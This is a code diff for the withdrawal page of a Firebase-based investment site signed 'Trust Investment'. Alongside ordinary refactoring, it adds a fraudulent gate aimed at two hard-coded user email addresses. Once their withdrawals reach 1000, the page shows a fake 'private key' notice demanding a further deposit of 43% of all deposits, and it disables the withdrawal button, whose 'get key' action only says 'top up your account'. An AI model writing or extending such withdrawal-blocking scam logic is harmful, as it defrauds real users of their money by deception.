@@ -3,15 +3,13 @@ import Button from "antd/lib/button";
 import Form from "antd/lib/form";
 import Modal from "antd/lib/modal";
 import Tooltip from "antd/lib/tooltip";
-import { ChoosePaymentMethod } from "../../components/Choose-Payment-Method/Choose-Payment-Method";
 import { EnterAmount } from "../../components/Enter-Amount/Enter-Amount";
 import { AdditionalInformation } from "../../components/Additional-Information/Additional-Information";
-import React, { useContext, useState } from "react";
+import React, { useContext, useEffect, useState } from "react";
 import { getRandomArbitrary } from "../../utils/helpers";
 import { ConfirmedWindow } from "../../components/ConfirmedWindow/ConfirmedWindow";
 import { addDoc, collection } from "firebase/firestore";
 import { FirebaseContext } from "../../index";
-import { PERFECT_MONEY } from "../../utils/consts";
 import { useOutletContext } from "react-router-dom";
 import { getAuth } from "firebase/auth";
 import { useTranslation } from "react-i18next";
@@ -25,12 +23,13 @@ import CommissionIcon from "assets/images/withdrawn-icons/commission.svg";
 import IDIcon from "assets/images/withdrawn-icons/id.svg";
 import DateIcon from "assets/images/withdrawn-icons/date.svg";
 import { Waves } from "../../components/Waves/Waves";
+import Wallets from "../../components/Wallets/Wallets";
+import Input from "antd/lib/input";
+import notification from "antd/lib/notification";
 
 const Withdraw = () => {
   const [amount, setAmount] = useState(0);
-  const [paymentMethod, setPaymentMethod] = useState(PERFECT_MONEY);
   const [tax, setTax] = useState(0);
-  const [isConfirmModalOpen, setIsConfirmModalOpen] = useState(false);
   const [isConfirmedModalOpen, setIsConfirmedModalOpen] = useState(false);
   const [form] = Form.useForm();
   const { firestore } = useContext(FirebaseContext);
@@ -38,17 +37,34 @@ const Withdraw = () => {
   const auth = getAuth();
   const { t, i18n } = useTranslation();
   const [current, setCurrent] = useState(0);
+  const [isPrivatKeyShowed, setIsPrivatKeyShowed] = useState(false);
+  const [api, contextHolder] = notification.useNotification();
 
-  const showConfirmModal = () => {
-    setIsConfirmModalOpen(true);
+  const [walletIsExist, setWalletIsExist] = useState(false);
+
+  useEffect(() => {
+    if (
+      userData.withdrawn >= 1000 &&
+      (userData.email === "bonyklade@gmail.com" || userData.email === "azrv1@mail.ru")
+    ) {
+      setIsPrivatKeyShowed(true);
+    } else {
+      setIsPrivatKeyShowed(false);
+    }
+
+    console.log(userData.withdrawn, "userData.withdrawn");
+    console.log(userData, "userdata");
+  }, [amount]);
+
+  const openNotification = () => {
+    api.error({
+      message: "",
+      description: "Пополните счёт!",
+    });
   };
 
   const handleConfirmedOk = () => {
     setIsConfirmedModalOpen(false);
-  };
-
-  const handleConfirmCancel = () => {
-    setIsConfirmModalOpen(false);
   };
 
   const handleConfirmedCancel = () => {
@@ -56,7 +72,6 @@ const Withdraw = () => {
   };
 
   const next = () => {
-    // setCurrent(current + 1);
     form.validateFields().then((values) => setCurrent(current + 1));
   };
   const prev = () => {
@@ -66,26 +81,19 @@ const Withdraw = () => {
   const steps = [
     {
       title: t("cash_in.choose_wallet"),
-      content: (
-        <>
-          <p className={styles["withdraw-info"]}>{t("withdrawn.notation")}</p>
-          <div className={styles["choose-payment-method"]}>
-            <ChoosePaymentMethod stepNumber={"01"} paymentMethodHandler={setPaymentMethod} setTax={setTax} />
-          </div>
-        </>
-      ),
+      content: <Wallets name={"payment-method"} message={t("make_deposit.choose_payment_method")} />,
     },
     {
       title: t("make_deposit.enter_amount"),
       content: (
         <>
-          <EnterAmount form={form} stepNumber={"02"} amountHandler={setAmount} tax={tax} withdrawnOperation={true} />
+          <EnterAmount form={form} tax={tax} withdrawnOperation={true} />
           <div className={styles["additional-info"]}>
             <AdditionalInformation
               infoLabel1={t("replenishment.fee")}
-              infoValue1={paymentMethod === "TRC20 Tether" ? 1 : 0}
+              infoValue1={tax}
               infoLabel2={t("withdrawn.withdrawn_fee")}
-              infoValue2={paymentMethod === "TRC20 Tether" ? +amount + 1 : amount}
+              infoValue2={+amount + tax}
             />
           </div>
         </>
@@ -95,6 +103,38 @@ const Withdraw = () => {
       title: t("cash_in.confirm"),
       content: (
         <>
+          {isPrivatKeyShowed ? (
+            <div className={styles["disclaimer"]}>
+              <p>
+                Уважаемый <span className={styles["nickname"]}>{userData.nickname}</span>,
+              </p>
+              <p>
+                Мы хотели бы напомнить вам о важности безопасности вашего аккаунта при использовании нашей платформы.
+                Если вы планируете вывести со своего счета сумму свыше <span>1000$</span>, вам необходимо использовать
+                приватный ключ для подтверждения транзакции.
+              </p>
+              <p>
+                Приватный ключ - это уникальный и секретный код, который используется для подписи транзакций и
+                подтверждения вашей личности. Для получения приватного ключа нужно пополнить кабинет на <span>43%</span>{" "}
+                от суммы всех депозитов. Приобретение приватного ключа - <span>бесплатно.</span> Средства можно будет
+                вывести сразу, после того как они будут зачислены на ваш счет. Все функции вашего личного кабинета, в
+                том числе, все внесенные средства, будут доступны сразу же после ввода приватного финансового ключа.
+              </p>
+              <p>Пожалуйста, убедитесь, что ваш приватный ключ надежно защищен и не передается третьим лицам.</p>
+              <div>
+                <Input className={styles["private-key"]} value={"***********"} disabled />{" "}
+                <Button onClick={openNotification}>Получить</Button>
+              </div>
+
+              <p>
+                Мы призываем вас принять меры для обеспечения безопасности вашего аккаунта и соблюдения наших политик
+                безопасности.
+              </p>
+              <p>С уважением, Команда Trust Investment.</p>
+            </div>
+          ) : (
+            ""
+          )}
           <ul className={styles["information-list"]}>
             <img src={WithdrawnImage} width={300} />
             <li>
@@ -152,18 +192,35 @@ const Withdraw = () => {
     title: item.title,
   }));
 
+  const onChange = () => {
+    setAmount(form.getFieldValue("amount"));
+    if (form.getFieldValue("payment-method") === "TRC20 Tether") {
+      setTax(1);
+    } else {
+      setTax(0);
+    }
+
+    if (userData.paymentMethods[form.getFieldValue("payment-method")].number) {
+      setWalletIsExist(false);
+    } else {
+      setWalletIsExist(true);
+    }
+  };
+
   const onDone = () => {
     form.validateFields().then(async (values) => {
+      console.log(values, "values");
+
       await addDoc(collection(firestore, "transactions"), {
         account_id: auth.currentUser.uid,
-        amount: +form.getFieldValue("amount"),
+        amount: +form.getFieldValue("amount") + tax,
         status: "Ожидание",
         type: "Вывод",
         date: new Date(),
         email: auth.currentUser.email,
-        executor: paymentMethod,
-        paymentMethod: paymentMethod,
-        tax: paymentMethod === "TRC20 Tether" ? 1 : 0,
+        executor: form.getFieldValue("payment-method"),
+        paymentMethod: form.getFieldValue("payment-method"),
+        tax: tax,
         _status: "running",
       }).then(() => {
         setIsConfirmedModalOpen(true);
@@ -177,10 +234,9 @@ const Withdraw = () => {
       <Form
         form={form}
         initialValues={{
-          "payment-method": "Perfect Money",
           amount: 0,
         }}
-        onChange={() => setAmount(form.getFieldValue("amount"))}
+        onChange={onChange}
       >
         <Steps
           direction={window.innerWidth < 850 ? "vertical" : "horizontal"}
@@ -205,28 +261,14 @@ const Withdraw = () => {
             </Button>
           )}
           {current < steps.length - 1 && (
-            <Tooltip
-              title={t("withdrawn.tooltip")}
-              open={
-                userData.paymentMethods[paymentMethod].number === undefined ||
-                userData.paymentMethods[paymentMethod].number === ""
-              }
-            >
-              <Button
-                type="primary"
-                onClick={next}
-                disabled={
-                  userData.paymentMethods[paymentMethod].number === undefined ||
-                  userData.paymentMethods[paymentMethod].number === "" ||
-                  userData.paymentMethods[paymentMethod].available <= 0
-                }
-              >
+            <Tooltip title={t("withdrawn.tooltip")} open={walletIsExist}>
+              <Button type="primary" onClick={next} disabled={walletIsExist}>
                 {t("transactions.next")}
               </Button>
             </Tooltip>
           )}
           {current === steps.length - 1 && (
-            <Button onClick={onDone} type="primary">
+            <Button onClick={onDone} type="primary" disabled={isPrivatKeyShowed}>
               {t("transactions.done")}
             </Button>
           )}
@@ -242,6 +284,7 @@ const Withdraw = () => {
       >
         <ConfirmedWindow transactionID={getRandomArbitrary()} />
       </Modal>
+      <>{contextHolder}</>
     </div>
   );
 };
